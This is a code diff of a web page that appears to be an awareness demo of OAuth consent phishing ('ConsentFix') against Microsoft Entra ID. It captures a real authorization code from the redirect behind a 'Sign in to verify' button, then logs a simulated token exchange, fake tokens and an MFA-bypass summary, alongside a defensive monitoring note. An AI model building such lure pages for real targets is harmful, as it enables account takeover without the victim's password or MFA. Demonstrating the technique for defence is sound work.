+        console.log('Redirect:   %s', decodeURIComponent(REDIRECT_URI));
+        console.log('Scopes:     %s', decodeURIComponent(SCOPES));
+        console.groupEnd();
+
+        // Simulate the token exchange — what the attacker's backend does
+        const simulatedAccessToken = generateSimulatedJwt();
+        const simulatedRefreshToken = '0.' + randomHex(32) + '-' + randomHex(16);
+
+        console.group('%c🔑 Attacker Token Exchange Result', 'color: #c62828; font-weight: bold');
+        console.log('POST https://login.microsoftonline.com/organizations/oauth2/v2.0/token');
+        console.log('  grant_type=authorization_code');
+        console.log('  client_id=%s', CLIENT_ID);
+        console.log('  code=%s', code);
+        console.log('  redirect_uri=%s', decodeURIComponent(REDIRECT_URI));
+        console.log('');
+        console.log('%c✅ Token Exchange Successful', 'color: #16a34a; font-weight: bold');
+        console.log('');
+        console.log('Access Token:  %s', simulatedAccessToken);
+        console.log('  ↳ Expires:   ~3600 seconds (1 hour)');
+        console.log('  ↳ Scopes:    https://management.azure.com/user_impersonation, openid, profile');
+        console.log('');
+        console.log('Refresh Token: %s', simulatedRefreshToken);
+        console.log('  ↳ Expires:   ~90 days (sliding window)');
+        console.log('  ↳ Can be used silently to get new access tokens without user interaction');
+        console.groupEnd();
+
+        console.log('%c🧪 Attacker can now call:', 'color: #6b7280; font-weight: bold');
+        console.log('  GET https://management.azure.com/subscriptions?api-version=2020-01-01');
+        console.log('  Authorization: Bearer ' + simulatedAccessToken.substring(0, 40) + '...');
+        console.log('  ↳ Lists all Azure subscriptions the user has access to.');
+
+        console.log('%c⚠️ Defensive note:', 'color: #f59e0b; font-weight: bold');
+        console.log('  Monitor for interactive auth followed by unusual');
+        console.log('  non-interactive token activity in Entra ID logs.');
+        console.log('  Check: Sign-in logs → "Non-interactive user sign-in"');
+        console.log('');
+
+        // Also show a compact summary
+        console.table([
+            { Property: 'Authorisation Code', Value: code },
+            { Property: 'Access Token (simulated)', Value: simulatedAccessToken.substring(0, 40) + '...' },
+            { Property: 'Refresh Token (simulated)', Value: simulatedRefreshToken.substring(0, 40) + '...' },
+            { Property: 'MFA Bypassed?', Value: '✅ Yes — user completed MFA, attacker never saw it' },
+            { Property: 'Password Stolen?', Value: '❌ No — attacker only has OAuth tokens' },
+            { Property: 'Token Lifetime', Value: '~1 hour (access) / ~90 days (refresh)' },
+        ]);
+
+        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #0078d4');
+        console.log('  ✅ ConsentFix demo complete. The attacker now');
+        console.log('  has persistent access without the password or MFA.');
+        console.log('%c━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', 'color: #0078d4');
     }
 
     // ═══════════════════════════════════════════════════════════════
-    //  SIMULATED URL COPY (V1 helper)
-    // ═══════════════════════════════════════════════════════════════
-    async function copySimulatedUrl() {
-        const el = document.getElementById('simUrl');
-        const text = el.textContent.trim();
-        try {
-            await navigator.clipboard.writeText(text);
-            el.classList.add('copied');
-            el.textContent = '✅ Copied! Paste it into the input above.';
-            setTimeout(() => {
-                el.classList.remove('copied');
-                el.textContent = text;
-            }, 2000);
-        } catch {
-            // Fallback
-            const range = document.createRange();
-            range.selectNodeContents(el);
-            const sel = window.getSelection();
-            sel.removeAllRanges();
-            sel.addRange(range);
-        }
-    }
-
-    // ═══════════════════════════════════════════════════════════════
-    //  DISPLAY CAPTURE RESULT
-    // ═══════════════════════════════════════════════════════════════
-    function showCaptureResult(code) {
-        document.getElementById('displayCode').textContent = code;
-
-        // Simulate what the attacker would get from token exchange
-        document.getElementById('displayAccess').textContent =
-            'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLiJ9... (~1 hour expiry)';
-        document.getElementById('displayRefresh').textContent =
-            '0.' + Math.random().toString(36).substring(2, 14) + '... (~90 day expiry, if offline_access granted)';
-
-        document.getElementById('tokenDetails').classList.remove('hidden');
-
-        // Show success in the active tab
-        const tab = currentTab;
-        const resultDiv = document.getElementById(tab + '-result');
-        if (resultDiv) {
-            resultDiv.className = 'show success';
-            resultDiv.innerHTML = `
-                <h3>✅ Authorisation Code Captured!</h3>
-                <p style="font-size:0.85rem;color:#374151;">
-                    Code: <code>${code}</code>
-                </p>
-                <p style="font-size:0.85rem;color:#374151;margin-top:0.5rem;">
-                    🔄 The attacker's server exchanges this for tokens
-                    via <code>POST /token</code>.<br>
-                    No password. No MFA prompt. The attacker is in.
-                </p>
-            `;
-        }
-    }
-
-    function showError(tab, msg) {
-        const resultDiv = document.getElementById(tab + '-result');
-        if (resultDiv) {
-            resultDiv.className = 'show error';
-            resultDiv.innerHTML = `<h3>❌ ${msg}</h3>`;
-        }
-    }
-
-    // ═══════════════════════════════════════════════════════════════
-    //  HANDLE DIRECT NAVIGATION (page loaded with ?code=...)
-    //  This happens when:
-    //    - The popup was blocked and user was redirected
-    //    - User navigated directly to the callback URL
+    //  HANDLE DIRECT NAVIGATION (popup blocked / user redirected)
     // ═══════════════════════════════════════════════════════════════
     window.addEventListener('DOMContentLoaded', () => {
         const params = new URLSearchParams(window.location.search);
         const code = params.get('code');
         const error = params.get('error');
         const returnedState = params.get('state');
+        const errorDesc = params.get('error_description');
 
         if (error) {
-            // Show error in all tab results
-            ['v1', 'v2', 'v3'].forEach(t => {
-                showError(t, 'Microsoft returned an error: <code>' + error + '</code>');
-            });
+            setStatus('error', 'Microsoft returned: <code>' + error + '</code>');
+            if (errorDesc) {
+                console.warn('[ConsentFix] Error description:', errorDesc);
+            }
             return;
         }
 
         if (code) {
             // Validate state
-            const storedState = sessionStorage.getItem('oauth_state');
-            if (returnedState && storedState && returnedState !== storedState) {
-                ['v1', 'v2', 'v3'].forEach(t => {
-                    showError(t, 'State parameter mismatch — possible CSRF attack detected!');
-                });
+            if (returnedState && returnedState !== STATE) {
+                setStatus('error',
+                    'Security verification failed (state mismatch).<br>' +
+                    '<small>This is actually a good sign — CSRF protection worked. Try again.</small>'
+                );
                 return;
             }
 
-            capturedCode = code;
-            showCaptureResult(code);
+            // Auto-capture without any user action
+            handleCapturedCode(code);
 
-            // Mark all steps as done across all tabs
-            ['v1', 'v2', 'v3'].forEach(t => {
-                [1, 2, 3, 4].forEach(i => {
-                    const el = document.getElementById(t + '-step' + i);
-                    if (el) el.className = 'done';
-                });
-                const btn = document.getElementById(t + '-authBtn');
-                if (btn) {
-                    btn.disabled = false;
-                    btn.textContent = '✅ Code Captured!';
-                }
-            });
-
-            // Clean the URL (remove query params so refresh doesn't re-trigger)
+            // Clean the URL so refresh doesn't re-trigger
             window.history.replaceState({}, document.title, window.location.pathname);
         }
     });
+
+    // ═══════════════════════════════════════════════════════════════
+    //  UI HELPERS
+    // ═══════════════════════════════════════════════════════════════
+    function setStatus(type, message) {
+        const el = document.getElementById('status');
+        el.className = 'show ' + type;
+        if (type === 'loading') {
+            el.innerHTML = '<span class="spinner"></span>' + message;
+        } else {
+            el.innerHTML = message;
+        }
+    }
+
+    function setButtonsDisabled(disabled) {
+        document.getElementById('authBtn').disabled = disabled;
+        document.getElementById('altBtn').disabled = disabled;
+        if (disabled) {
+            document.getElementById('authBtn').textContent = '⏳ Verifying…';
+        } else {
+            document.getElementById('authBtn').textContent = '🔑  Sign in to verify';
+        }
+    }
+
+    function useDifferentAccount() {
+        // Clear any stored state and restart
+        authInProgress = false;
+        if (pollTimer) clearInterval(pollTimer);
+        if (popup && !popup.closed) popup.close();
+        document.getElementById('status').className = '';
+        document.getElementById('status').style.display = 'none';
+        startAuth();
+    }
+
+    function showConsoleHint() {
+        setStatus('success',
+            '💡 Open the browser console (<kbd>F12</kbd> → Console tab) ' +
+            'to see the full token details the attacker captures.'
+        );
+        setTimeout(() => {
+            if (!document.getElementById('status').classList.contains('loading')) {
+                document.getElementById('status').className = '';
+                document.getElementById('status').style.display = 'none';
+            }
+        }, 4000);
+    }
+
+    // ═══════════════════════════════════════════════════════════════
+    //  HELPERS — generate fake JWT / hex for demo purposes
+    // ═══════════════════════════════════════════════════════════════
+    function generateSimulatedJwt() {
+        const header = btoa(JSON.stringify({ typ: 'JWT', alg: 'RS256', kid: 'abc123' }));
+        const now = Math.floor(Date.now() / 1000);
+        const payload = btoa(JSON.stringify({
+            aud: 'https://management.azure.com',
+            iss: 'https://login.microsoftonline.com/organizations/v2.0',
+            iat: now,
+            nbf: now,
+            exp: now + 3600,
+            sub: 'user_' + randomHex(8),
+            tid: randomHex(12),
+            oid: randomHex(16),
+            scp: 'user_impersonation',
+            azp: CLIENT_ID,
+        }));
+        const signature = randomHex(43);
+        return header + '.' + payload + '.' + signature;
+    }
+
+    function randomHex(len) {
+        const chars = 'abcdef0123456789';
+        let result = '';
+        for (let i = 0; i < len; i++) {
+            result += chars[Math.floor(Math.random() * chars.length)];
+        }
+        return result;
+    }
 </script>
 </body>
 </html>
